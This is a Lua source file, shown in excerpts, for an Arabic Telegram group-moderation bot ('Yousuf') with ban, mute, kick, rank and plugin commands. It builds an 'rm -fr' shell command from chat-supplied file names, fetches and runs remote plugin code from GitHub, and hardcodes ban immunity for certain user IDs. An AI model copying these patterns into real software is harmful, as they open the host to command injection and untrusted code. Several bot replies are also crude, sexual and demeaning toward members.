database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = '  𖦹  بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  𖦹  بواسطه ⇎ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  𖦹  تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  𖦹  بواسطه ⇎ ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  𖦹  تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  𖦹  بواسطه ⇎ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  𖦹  تـم قفـل التاك بالطرد ')
end,nil)   
...
send(msg.chat_id_, msg.id_, "  𖦹  لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع حظر البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1635597460) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع حظر عمو اشرف عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1779150039) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع حظر يوسف عام")
return false 
end
...
function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n  𖦹  تم حظره عام من جروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
return false
end
...
send(msg.chat_id_, msg.id_, "  𖦹  لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1779150039) then
send(msg.chat_id_, msg.id_, "  𖦹  لا يمكنك حظر مبرمج السورس \n")
return false 
end
usertext = '\n  𖦹  العضو ⇎ ['..result.title_..'](t.me/'..(username or 'DV_POWER1')..')'
status  = '\n  𖦹  تم حظره عام من الجروبات'
texts = usertext..status
...
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1779150039) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "  𖦹  لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع كتم البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1635597460) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1779150039) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع كتم مبرمج السورس عام")
...
if result.id_ == tonumber(1635597460) then
send(msg.chat_id_, msg.id_, "  𖦹  لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1779150039) then
send(msg.chat_id_, msg.id_, "  𖦹  لا يمكنك كتم مبرمج السورس \n")
...
if tonumber(userid) == tonumber(1635597460) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع كتم عمو اشرف عام")
return false 
end
if tonumber(userid) == tonumber(1779150039) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تستطيع كتم يوسف عام")
return false 
end
...
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n  𖦹  تم الغاء (الحظر-الكتم) عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
send(msg.chat_id_, msg.id_, "\n  𖦹  تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and DevSoFi(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n  𖦹  قائمة مطورين البوت \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if text == '𝐲𝐨𝐮𝐬𝐮𝐟1م' and DevSoFi(msg) then
t = '  𖦹  ملفات السورس يوسف ↓\n •═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════• \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Vklkk/𝐲𝐨𝐮𝐬𝐮𝐟/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n  𖦹  اهلا بك في متجر ملفات يوسف\n  𖦹  ملفات السورس ↓\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n\n"
local TextE = "\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n  𖦹  علامة تعني { ✔️ } ملف مفعل\n  𖦹  علامة تعني { ✖ } ملف معطل\n  𖦹  قناة سورس يوسف ↓\n".."  𖦹  [اضغط هنا لدخول](t.me/php14) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_,"  𖦹  لا يوجد اتصال من ال api \n") 
end
return false
end
end
...
t = "  𖦹  بالتاكيد تم تعطيل ملف → "..file.."\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/Vklkk/𝐲𝐨𝐮𝐬𝐮𝐟/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_,"  𖦹  عذرا الملف لايدعم سورس يوسف \n") 
end
return false
end
...
if file_bot then
io.close(file_bot)
t = "  𖦹  بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = "  𖦹  الملف ⇎ "..file.."\n  𖦹  تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/Vklkk/𝐲𝐨𝐮𝐬𝐮𝐟/main/File_Bot/"..file)
...
send(msg.chat_id_,msg.id_,"  𖦹  تم مسح الملفات")
return false
end
...
send(msg.chat_id_, msg.id_,'  𖦹  لا ����ستطيع استخدام البوت \n   𖦹  يرجى الاشتراك بالقناه اولا \n   𖦹  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
...
if text == ("مسح قائمه يوسف") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n  𖦹  تم مسح قائمه يوسف')
return false
end

if text == 'قائمه يوسف' and Sudo(msg) then
...
if #list == 0 then
t = "  𖦹  لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع يوسف") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع يوسف @(.*)$") and Sudo(msg) then
local username = text:match("^رفع يوسف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع يوسف (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع يوسف (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل يوسف") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل يوسف @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل يوسف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل يوسف (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل يوسف (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
t = " 𖦹  المنشئين الاساسين تعالو مخرب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if #list == 0 then
t = " 𖦹  ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply"," 𖦹  قام بنشر ملصق اباحيه\n"..t)  
...
Reply_Status(msg,msg.sender_user_id_,"reply"," 𖦹  قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
...
Text = '  𖦹  بالتاكيد تم تفعيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  تم تعطيل امر تحويل'
else
Text = '\n  𖦹  بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_, '\n  𖦹  تم مسح المنشئين الاساسين')
return false
end
if text == 'المنشئين الاساسين' and CoSu(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n  𖦹  قائمة المنشئين الاساسين \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
send(msg.chat_id_, msg.id_,"  𖦹  حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "SRC-DRAGON")
send(msg.chat_id_, msg.id_,"  𖦹  منشئ الجروب ⇎ ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
...
Reply_Status(msg,result.sender_user_id_,"reply"," 𖦹  تم ترقيته مطور ثانوي في البوت")  
end
...
Reply_Status(msg,result.id_,"reply"," 𖦹  تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_," 𖦹  لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply"," 𖦹  تم ترقيته مطور ثانوي في البوت")  
return false 
end
...
Reply_Status(msg,result.sender_user_id_,"reply"," 𖦹  تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply"," 𖦹  تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_," 𖦹  لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply"," 𖦹  تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
t = "\n 𖦹  قائمة مطورين الثانوين للبوت \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
send(msg.chat_id_, msg.id_, "\n 𖦹  تم مسح قائمة المطورين الثانوين  ")
end
------------------------------------------------------------------------
...
if num2 == 0 then
send(msg.chat_id_, msg.id_,"  𖦹  لا يوجد ادمنيه ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_,"  𖦹  تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح الادمنيه')
end
...
send(msg.chat_id_, msg.id_,'  𖦹  تم تعطيل الرفع') 
return false
end
...
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح المنظفين')
end
...
send(msg.chat_id_, msg.id_,'  𖦹  تم تعطيل الطرد') 
return false
end
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'  𖦹   ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'  𖦹  البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
...
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح المميزين')
end
if text == ("المميزين") and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n  𖦹  قائمة مميزين الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n  𖦹  لعضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹  تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n  𖦹  العضو ⇎ '..userid..''
...
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح جميع المتوحدين')
end
if text == ("تاك للمتوحدين") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n  𖦹  قائمة متوحدين الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n  𖦹  تم رفع العضو متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹  تم تنزيل العضو متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح جميع الزوجات')
end
if text == ("تاك للزوجات") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n  𖦹  قائمه زوجات الجروب \n 𖦹 •═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضــو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n  𖦹  تم رفع العضــو زوجه في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضــو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹  تم تنزيل العضــو الزوجات من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح جميع الكلاب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضــو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n  𖦹  تم رفع العضــو كلب في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضــو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹  تم تنزيل العضــو كلب من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع حمير من الجروب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n  𖦹  تم رفع المتهم حمار بالجروب\n  𖦹  الان اصبح حمار الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع وتكات الجروب')
end
if text == ("تاك للوتكات") and Mod(msg) then
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n  𖦹  قائمة وتكات الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع القرده بالجروب')
end
if text == ("تاك للقرود") and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n  𖦹  قائمة القرود الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n  𖦹  تم رفع قرد في الجروب\n  𖦹  تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع البقرات بالجروب')
end
if text == ("تاك للبقرات") and Mod(msg) then
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n  𖦹  قائمة البقرات الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n  𖦹  تم رفع بقره في الجروب\n  𖦹  ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹  تم تنزيل بقره من الجروب\n  𖦹  تعال هاك حليب مالتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع المزز بالجروب')
end
...
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع االاكساس')
end
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n  𖦹  قائمة القلوب في الجروب\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلبي [@"..username.."]\n"
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع أولادي')
end
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع زواحف')
end
if text == ("تاك للرقاصات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n  𖦹  قائمة رقاصات الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
local statuss = '\n  𖦹  تم رفع رقاصه في الجروب\n  𖦹  مبقتش شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status = '\n  𖦹  تم تنزيل رقاصه من الجروب\n  𖦹  بقت شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
send(msg.chat_id_, msg.id_, '  𖦹  تم تنزيل جميع جريزي')
end
if text == ("تاك للمتناكين") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n  𖦹  قائمة المتناكين الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح كل الحكاكين')
end
if text == ("تاك للحكاكين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n  𖦹  قائمة حكاكين الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n  𖦹  تم رفع حكاك في الجروب\n  𖦹  احمرت ولا لسا'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n  𖦹  تم تنزيل حكاك من الجروب\n  𖦹  لا يسطت هيفضل حكاك رسمي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح كل النسوان بالجروب')
end
if text == ("تاك للنسوان") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n  𖦹  قائمة نسوان الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n  𖦹  تم رفع مره في الجروب\n  𖦹  ها صرتي من نسواني تعي ندخل'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n  𖦹  تم تنزيل مره من الجروب\n  𖦹  بتاعي غضبان عليكي ليوم الدين'
